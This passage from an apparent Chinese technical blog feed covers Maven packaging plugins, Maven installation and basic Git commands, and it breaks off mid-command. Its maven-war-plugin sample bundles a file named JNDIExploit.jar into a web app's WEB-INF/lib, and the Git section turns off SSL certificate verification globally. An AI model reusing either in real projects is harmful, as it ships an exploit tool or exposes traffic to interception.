class="hljs-name">execution</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>make-assembly<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">phase</span>&gt;</span>package<span class="hljs-tag">&lt;/<span class="hljs-name">phase</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">goals</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">goal</span>&gt;</span>single<span class="hljs-tag">&lt;/<span class="hljs-name">goal</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">goals</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">descriptors</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">descriptor</span>&gt;</span>src/main/resources/assembly.xml<span class="hljs-tag">&lt;/<span class="hljs-name">descriptor</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">descriptors</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">execution</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">executions</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span></code></pre></div><ol><li>创建assembly.xml文件</li></ol><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">assembly</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>jar-with-dependencies<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">formats</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">format</span>&gt;</span>war<span class="hljs-tag">&lt;/<span class="hljs-name">format</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">formats</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">includeBaseDirectory</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">includeBaseDirectory</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencySets</span>&gt;</span>        <span class="hljs-comment">&lt;!-- 默认的配置 --&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">dependencySet</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">outputDirectory</span>&gt;</span>/<span class="hljs-tag">&lt;/<span class="hljs-name">outputDirectory</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">useProjectArtifact</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">useProjectArtifact</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">unpack</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">unpack</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependencySet</span>&gt;</span>        <span class="hljs-comment">&lt;!-- 增加scope类型为system的配置 --&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">dependencySet</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">outputDirectory</span>&gt;</span>/<span class="hljs-tag">&lt;/<span class="hljs-name">outputDirectory</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">useProjectArtifact</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">useProjectArtifact</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">unpack</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">unpack</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>system<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependencySet</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencySets</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">assembly</span>&gt;</span></code></pre></div><h1 id="maven-shade-plugin"><a href="#maven-shade-plugin" class="headerlink" title="maven-shade-plugin"></a>maven-shade-plugin</h1><h2 id="打包效果-2"><a href="#打包效果-2" class="headerlink" title="打包效果"></a>打包效果</h2><p>生成一个jar包，jar包里面是将class类拷贝</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230315164934654.png" alt="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230315164934654.png"></p><h2 id="插件坐标"><a href="#插件坐标" class="headerlink" title="插件坐标"></a>插件坐标</h2><div class="code-wrapper"><pre><code class="hljs xml">https://mvnrepository.com/artifact/org.apache.maven.plugins/maven-shade-plugin</code></pre></div><h2 id="使用示例-1"><a href="#使用示例-1" class="headerlink" title="使用示例"></a>使用示例</h2><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-shade-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.4.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">executions</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">execution</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">phase</span>&gt;</span>package<span class="hljs-tag">&lt;/<span class="hljs-name">phase</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">goals</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">goal</span>&gt;</span>shade<span class="hljs-tag">&lt;/<span class="hljs-name">goal</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">goals</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">transformers</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">transformer</span> <span class="hljs-attr">implementation</span>=<span class="hljs-string">&quot;org.apache.maven.plugins.shade.resource.ManifestResourceTransformer&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mainClass</span>&gt;</span>com.xxg.Main<span class="hljs-tag">&lt;/<span class="hljs-name">mainClass</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">transformer</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">transformers</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">execution</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">executions</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span></code></pre></div><h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><p>如果项目中用到了Spring Framework，将依赖打到一个jar包中，运行时会出现读取XML schema文件出错。原因是Spring Framework的多个jar包中包含相同的文件spring.handlers和spring.schemas，如果生成一个jar包会互相覆盖。为了避免互相影响，可以使用AppendingTransformer来对文件内容追加合并：</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-shade-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.4.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">executions</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">execution</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">phase</span>&gt;</span>package<span class="hljs-tag">&lt;/<span class="hljs-name">phase</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">goals</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">goal</span>&gt;</span>shade<span class="hljs-tag">&lt;/<span class="hljs-name">goal</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">goals</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">transformers</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">transformer</span> <span class="hljs-attr">implementation</span>=<span class="hljs-string">&quot;org.apache.maven.plugins.shade.resource.ManifestResourceTransformer&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mainClass</span>&gt;</span>com.xxg.Main<span class="hljs-tag">&lt;/<span class="hljs-name">mainClass</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">transformer</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">transformer</span> <span class="hljs-attr">implementation</span>=<span class="hljs-string">&quot;org.apache.maven.plugins.shade.resource.AppendingTransformer&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">resource</span>&gt;</span>META-INF/spring.handlers<span class="hljs-tag">&lt;/<span class="hljs-name">resource</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">transformer</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">transformer</span> <span class="hljs-attr">implementation</span>=<span class="hljs-string">&quot;org.apache.maven.plugins.shade.resource.AppendingTransformer&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">resource</span>&gt;</span>META-INF/spring.schemas<span class="hljs-tag">&lt;/<span class="hljs-name">resource</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">transformer</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">transformers</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">execution</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">executions</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span></code></pre></div><h1 id="spring-boot-maven-plugin"><a href="#spring-boot-maven-plugin" class="headerlink" title="spring-boot-maven-plugin"></a>spring-boot-maven-plugin</h1><h2 id="打包效果-3"><a href="#打包效果-3" class="headerlink" title="打包效果"></a>打包效果</h2><p>生成一个jar包</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230315162933134.png" alt="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230315162933134.png"></p><h2 id="插件坐标-1"><a href="#插件坐标-1" class="headerlink" title="插件坐标"></a>插件坐标</h2><div class="code-wrapper"><pre><code class="hljs xml">https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-maven-plugin</code></pre></div><h2 id="使用示例-2"><a href="#使用示例-2" class="headerlink" title="使用示例"></a>使用示例</h2><h3 id="mvn-package-2"><a href="#mvn-package-2" class="headerlink" title="mvn package"></a>mvn package</h3><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.7.9<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">executions</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">execution</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">goals</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">goal</span>&gt;</span>repackage<span class="hljs-tag">&lt;/<span class="hljs-name">goal</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">goals</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">execution</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">executions</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><span class="hljs-comment">&lt;!--指定main入口--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mainClass</span>&gt;</span>com.example.service.DubboProvider<span class="hljs-tag">&lt;/<span class="hljs-name">mainClass</span>&gt;</span><span class="hljs-comment">&lt;!--若仅需springboot插件打包后可引用项目的类，加入下面的配置，使用名称不带exec的包做依赖--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">classifier</span>&gt;</span>exec<span class="hljs-tag">&lt;/<span class="hljs-name">classifier</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span></code></pre></div><h3 id="将本地库的jar一起打包"><a href="#将本地库的jar一起打包" class="headerlink" title="将本地库的jar一起打包"></a>将本地库的jar一起打包</h3><ol><li>将本地库的jar范围设置为system</li></ol><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.pacemrc.jar3<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jar1<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>system<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">systemPath</span>&gt;</span>$&#123;project.basedir&#125;/lib/jar1.jar<span class="hljs-tag">&lt;/<span class="hljs-name">systemPath</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre></div><ol><li>配置插件</li></ol><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">includeSystemScope</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">includeSystemScope</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">executions</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">execution</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">goals</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">goal</span>&gt;</span>repackage<span class="hljs-tag">&lt;/<span class="hljs-name">goal</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">goals</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">execution</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">executions</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span></code></pre></div><h1 id="maven-war-plugin"><a href="#maven-war-plugin" class="headerlink" title="maven-war-plugin"></a>maven-war-plugin</h1><p><strong>Java web项目插件</strong>，下面代码示例如何将lib依赖库的文件一起打包</p><div class="code-wrapper"><pre><code class="hljs bash">&lt;plugin&gt;  &lt;artifactId&gt;maven-war-plugin&lt;/artifactId&gt;  &lt;version&gt;3.2.2&lt;/version&gt;  &lt;configuration&gt;&lt;webResources&gt;  &lt;resource&gt;&lt;directory&gt;<span class="hljs-variable">$&#123;project.basedir&#125;</span>/lib&lt;/directory&gt;&lt;targetPath&gt;WEB-INF/lib&lt;/targetPath&gt;&lt;includes&gt;  &lt;include&gt;JNDIExploit.jar&lt;/include&gt;&lt;/includes&gt;  &lt;/resource&gt;&lt;/webResources&gt;  &lt;/configuration&gt;&lt;/plugin&gt;</code></pre></div><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/xiao__gui/article/details/47341385#">https://blog.csdn.net/xiao__gui&#x2F;article&#x2F;details&#x2F;47341385#</a></p><p>maven多模块项目springboot打包：</p><p><a href="https://blog.csdn.net/Blackjoker0/article/details/126954209">https://blog.csdn.net/Blackjoker0/article/details/126954209</a></p><p><a href="https://blog.csdn.net/yuchuanzhang/article/details/127650037">https://blog.csdn.net/yuchuanzhang/article/details/127650037</a></p>]]></content>
    
    
    <categories>
      
      <category>软件教程</category>
      
      <category>Maven</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Maven</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Maven安装</title>
    <link href="/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/Maven/"/>
    <url>/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/Maven/</url>
    
    <content type="html"><![CDATA[<h1 id="安装包下载"><a href="#安装包下载" class="headerlink" title="安装包下载"></a>安装包下载</h1><p><a href="https://maven.apache.org/download.cgi">https://maven.apache.org/download.cgi</a></p><p>Windows</p><p><a href="https://archive.apache.org/dist/maven/maven-3/3.8.5/binaries/apache-maven-3.8.5-bin.zip">https://archive.apache.org/dist/maven/maven-3/3.8.5/binaries/apache-maven-3.8.5-bin.zip</a></p><p>Linux</p><p><a href="https://archive.apache.org/dist/maven/maven-3/3.8.5/binaries/apache-maven-3.8.5-bin.tar.gz">https://archive.apache.org/dist/maven/maven-3/3.8.5/binaries/apache-maven-3.8.5-bin.tar.gz</a></p><h1 id="Linux安装"><a href="#Linux安装" class="headerlink" title="Linux安装"></a>Linux安装</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><div class="code-wrapper"><pre><code class="hljs pgsql">tar -xf apache-maven<span class="hljs-number">-3.8</span><span class="hljs-number">.5</span>-bin.tar.gz -C /usr/<span class="hljs-keyword">local</span>/mv /usr/<span class="hljs-keyword">local</span>/apache-maven<span class="hljs-number">-3.8</span><span class="hljs-number">.5</span> /usr/<span class="hljs-keyword">local</span>/mavencat <span class="hljs-symbol">&lt;&lt; EOF &gt;&gt;</span> /etc/profileexport MAVEN_HOME=/usr/<span class="hljs-keyword">local</span>/mavenexport <span class="hljs-type">PATH</span>=$MAVEN_HOME/bin:$<span class="hljs-type">PATH</span>EOFsource /etc/profile</code></pre></div><p><strong>验证</strong></p><div class="code-wrapper"><pre><code class="hljs armasm"><span class="hljs-keyword">mvn</span> -v</code></pre></div><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>vim &#x2F;usr&#x2F;local&#x2F;maven&#x2F;conf&#x2F;settings.xml</p><p><strong>设置国内镜像源</strong></p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">mirror</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>nexus-aliyun<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">mirrorOf</span>&gt;</span>central<span class="hljs-tag">&lt;/<span class="hljs-name">mirrorOf</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Nexus aliyun<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/groups/public/<span class="hljs-tag">&lt;/<span class="hljs-name">url</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">mirror</span>&gt;</span></code></pre></div><p><strong>配置本地仓库</strong></p><div class="code-wrapper"><pre><code class="hljs awk">mkdir <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/maven/</span>localrepo  &lt;localRepository&gt;<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/maven/</span>localrepo&lt;/localRepository&gt;</code></pre></div><h1 id="Windows安装"><a href="#Windows安装" class="headerlink" title="Windows安装"></a>Windows安装</h1><p><strong>配置环境变量</strong></p><p>Windows</p><div class="code-wrapper"><pre><code class="hljs livescript">MAVEN_HOMED:<span class="hljs-string">\Program</span> Files<span class="hljs-string">\JetBrains\apache-maven-3.8.5</span>PATH%MAVEN_HOME%<span class="hljs-string">\bin</span></code></pre></div>]]></content>
    
    
    <categories>
      
      <category>软件安装</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Maven</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Git教程</title>
    <link href="/%E8%BD%AF%E4%BB%B6%E6%95%99%E7%A8%8B/Git/"/>
    <url>/%E8%BD%AF%E4%BB%B6%E6%95%99%E7%A8%8B/Git/</url>
    
    <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><h2 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h2><p>Git是免费开源的分布式版本控制工具，可以对开发项目中的文件进行版本控制。</p><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><p>开发项目的源代码备份</p><p>多人开发同一项目</p><p>开发项目的版本切换</p><h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><p>将本地项目初始化为git项目后，将工作区中需要进行版本控制的文件添加到暂存区，完善代码后需要commit操作将暂存区的文件提交到本地仓库，本地仓库中的文件可以使用push操作备份到远程仓库。</p><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>本地仓库：将本地开发项目初始化为git项目的文件夹<br>远程仓库：用于托管存储项目代码的平台，如gitee，github，gitlab</p><p>分支：分支是当项目的主线版本在开发过程中接到新的需求，为了使得新需求的代码不影响主线版本而使用的技术手段。git项目在创建时默认存在一个master主分支，分支可以创建多个，彼此之间互相隔离互不影响。</p><p>标签：标签是某个分支在某一时间的状态，类似于快照。常使用vX.X.X作为版本标识。</p><p>工作区：在一路径下除.git文件夹外的区域，该区域存放着源代码、配置文件等文件</p><p>暂存区：.git文件夹下的index文件。该文件记录着处于暂存区的所有文件。</p><p>版本历史信息：</p><p>.gitignore：在idea集成git中，可通过该文件排除不需要进行提交的文件</p><p>文件的状态：</p><h1 id="权限认证"><a href="#权限认证" class="headerlink" title="权限认证"></a>权限认证</h1><p>推荐使用git 凭据管理器进行授权</p><h1 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h1><h2 id="本地仓库的操作"><a href="#本地仓库的操作" class="headerlink" title="本地仓库的操作"></a>本地仓库的操作</h2><h3 id="全局配置"><a href="#全局配置" class="headerlink" title="全局配置"></a>全局配置</h3><p>查看全局配置</p><div class="code-wrapper"><pre><code class="hljs lua">git <span class="hljs-built_in">config</span> <span class="hljs-comment">--global -l</span></code></pre></div><p>配置git全局用户名称</p><div class="code-wrapper"><pre><code class="hljs lua">git <span class="hljs-built_in">config</span>  <span class="hljs-comment">--global user.name xxxx</span></code></pre></div><p>配置git全局邮箱地址</p><div class="code-wrapper"><pre><code class="hljs autoit">git config  --<span class="hljs-keyword">global</span> user.email xxxx<span class="hljs-symbol">@qq</span>.com</code></pre></div><p>关闭ssl证书验证</p><div class="code-wrapper"><pre><code class="hljs arduino">git config --global http.sslVerify <span class="hljs-literal">false</span></code></pre></div><p>配置代理</p><div class="code-wrapper"><pre><code class="hljs stylus">git config <span class="hljs-attr">--global</span> http<span class="hljs-selector-class">.proxy</span> http:<span class="hljs-comment">//127.0.0.1:7890</span>git config <span class="hljs-attr">--global</span> https<span class="hljs-selector-class">.proxy</span> http:<span class="hljs-comment">//127.0.0.1:7890</span></code></pre></div><p>取消代理</p><div class="code-wrapper"><pre><code class="hljs stylus">git config <span class="hljs-attr">--global</span> <span class="hljs-attr">--unset</span> http<span class="hljs-selector-class">.proxy</span>git config <span class="hljs-attr">--global</span> <span class="hljs-attr">--unset</span> https.proxy</code></pre></div><h3 id="创建本地仓库"><a href="#创建本地仓库" class="headerlink" title="创建本地仓库"></a>创建本地仓库</h3><div class="code-wrapper"><pre><code class="hljs csharp">git <span class="hljs-keyword">init</span></code></pre></div><p>将在当前目录创建一个<code>.git</code>文件夹</p><h3 id="将工作区文件添加到暂存区"><a href="#将工作区文件添加到暂存区" class="headerlink" title="将工作区文件添加到暂存区"></a>将工作区文件添加到暂存区</h3><div class="code-wrapper"><pre><code class="hljs armasm"><span class="hljs-symbol">git</span> <span class="hljs-keyword">add</span> &lt;filename&gt;   <span class="hljs-comment">//添加单个文件</span><span class="hljs-symbol">git</span> <span class="hljs-keyword">add</span> --all <span class="hljs-comment">//添加工作区的所有文件</span></code></pre></div><p>执行git add命令后.git文件夹内新增一个index文件，该index文件记录着暂存区的所有文件</p><h3 id="查看暂存区文件状态"><a href="#查看暂存区文件状态" class="headerlink" title="查看暂存区文件状态"></a>查看暂存区文件状态</h3><div class="code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">git status</span></code></pre></div><h3 id="将暂存区文件到提交本地仓库"><a href="#将暂存区文件到提交本地仓库" class="headerlink" title="将暂存区文件到提交本地仓库"></a>将暂存区文件到提交本地仓库</h3><div class="code-wrapper"><pre><code class="hljs gherkin">git commit -m <span class="hljs-string">&quot;commit message&quot;</span> <span class="hljs-variable">&lt;filename&gt;</span>  <span class="hljs-comment">#将指定文件的更改提交</span>git commit -m <span class="hljs-string">&quot;commit message&quot;</span> .  <span class="hljs-comment">#将当前目录下的所有已暂存的更改提交</span></code></pre></div><h3 id="查看git操作记录"><a href="#查看git操作记录" class="headerlink" title="查看git操作记录"></a>查看git操作记录</h3><div class="code-wrapper"><pre><code class="hljs 1c">git <span class="hljs-built_in">log</span></code></pre></div><p>执行git commit操作后会自动生成一个commit id，执行git log命令会显示该ID，另外打印出提交人的信息和提交时间，（HEAD -&gt; master）表示当前处于该版本</p><h3 id="版本回退"><a href="#版本回退" class="headerlink" title="版本回退"></a>版本回退</h3><div class="code-wrapper"><pre><code class="hljs jboss-cli">git log   <span class="hljs-string">//</span>获取commitIDgit reset <span class="hljs-params">--soft</span> commitID   <span class="hljs-string">//</span>只进行对commit操作的回退，不影响工作区的文件，当发现之前的提交有错误的代码，推荐使用soft进行处理，这样会把错误的提交日志进行废弃，git log就查看不到那一次错误的提交日志。git reset <span class="hljs-params">--hard</span> commitID   <span class="hljs-string">//</span>回退commit操作和工作区的文件</code></pre></div><h2 id="远程仓库的操作"><a href="#远程仓库的操作" class="headerlink" title="远程仓库的操作"></a>远程仓库的操作</h2><h3 id="创建远程仓库"><a href="#创建远程仓库" class="headerlink" title="创建远程仓库"></a>创建远程仓库</h3><p>以github演示，在个人主页点击<code>new repository</code>进入创建页面，需要定义仓库的名称，仓库的访问权限公开or私有其他默认即可，最后点击<code>create repository</code>完成创建。</p><h3 id="本地仓库绑定远程仓库"><a href="#本地仓库绑定远程仓库" class="headerlink" title="本地仓库绑定远程仓库"></a>本地仓库绑定远程仓库</h3><div class="code-wrapper"><pre><code class="hljs armasm"><span class="hljs-symbol">git</span> remote <span class="hljs-keyword">add</span> testGit01 https:<span class="hljs-comment">//github.com/pacemrc/testGit.git</span></code></pre></div><h3 id="查看远程仓库"><a href="#查看远程仓库" class="headerlink" title="查看远程仓库"></a>查看远程仓库</h3><div class="code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">git remote</span><span class="hljs-attribute">git remote -v</span></code></pre></div><h3 id="将本地仓库的代码推送到远程仓库"><a href="#将本地仓库的代码推送到远程仓库" class="headerlink" title="将本地仓库的代码推送到远程仓库"></a>将本地仓库的代码推送到远程仓库</h3><div class="code-wrapper"><pre><code class="hljs avrasm">git <span class="hljs-keyword">push</span> -u 远程仓库别名 分支名称git <span class="hljs-keyword">push</span> -f -u 远程仓库别名 分支名称    <span class="hljs-meta">#强制覆盖之前的commit提交代码</span></code></pre></div><p>第一次推送需要进行仓库的授权认证</p><h3 id="将远程仓库克隆到本地"><a href="#将远程仓库克隆到本地" class="headerlink" title="将远程仓库克隆到本地"></a>将远程仓库克隆到本地</h3><div class="code-wrapper"><pre><code class="hljs crmsh">git <span class="hljs-keyword">clone</span> 